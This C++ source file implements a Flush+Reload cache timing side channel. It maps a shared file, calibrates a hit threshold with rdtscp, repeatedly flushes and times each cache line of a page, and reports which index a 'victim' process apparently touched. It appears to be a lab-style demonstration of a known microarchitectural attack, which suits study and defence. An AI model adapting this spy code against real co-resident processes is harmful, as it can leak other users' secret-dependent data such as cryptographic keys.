#include <x86intrin.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <iostream>
#include <stdint.h>

#define PAGE_SIZE 4096
#define STRIDE 64
#define NUM_LINES (PAGE_SIZE / STRIDE)

using namespace std;

uint64_t measure(volatile unsigned char *addr)
{
    unsigned int aux;
    uint64_t start, end;

    _mm_mfence();
    _mm_lfence();

    start = __rdtscp(&aux);
    *addr;
    _mm_lfence();
    end = __rdtscp(&aux);

    return end - start;
}

int main()
{
    int fd = open("shared_mem.bin", O_RDWR, 0666);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    unsigned char *shared =
        (unsigned char*) mmap(NULL, PAGE_SIZE,
        PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

    if (shared == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    /* ----------- threshold calibration ----------- */

    uint64_t cached = 0, uncached = 0;

    for(int i=0;i<100;i++)
    {
        volatile unsigned char tmp = shared[0];
        cached += measure(&shared[0]);
    }

    for(int i=0;i<100;i++)
    {
        _mm_clflush(&shared[0]);
        _mm_mfence();
        uncached += measure(&shared[0]);
    }

    cached /= 100;
    uncached /= 100;

    uint64_t CACHE_HIT_THRESHOLD = (cached + uncached) / 2;

    cout << "Cached latency: " << cached << endl;
    cout << "Uncached latency: " << uncached << endl;
    cout << "Threshold: " << CACHE_HIT_THRESHOLD << endl;

    int hits[NUM_LINES] = {0};

    while(true)
    {
        /* flush entire page */
        for(int i=0;i<NUM_LINES;i++)
        {
            _mm_clflush(&shared[i*STRIDE]);
        }

        _mm_mfence();

        /* small pause to let victim run */
        usleep(50);

        /* probe cache lines in mixed order */
        for(int i=0;i<NUM_LINES;i++)
        {
            int mix_i = ((i * 167) + 13) & (NUM_LINES - 1);

            uint64_t t = measure(&shared[mix_i * STRIDE]);

            if(t < CACHE_HIT_THRESHOLD)
                hits[mix_i]++;
        }

        static int rounds = 0;
        rounds++;

        if(rounds % 1000 == 0)
        {
            int best = -1;
            int best_score = 0;

            for(int i=0;i<NUM_LINES;i++)
            {
                if(hits[i] > best_score)
                {
                    best_score = hits[i];
                    best = i;
                }
            }

            cout << "Most likely index: "
                 << best
                 << " hits: "
                 << best_score
                 << endl;

            for(int i=0;i<NUM_LINES;i++)
                hits[i] = 0;
        }
    }
}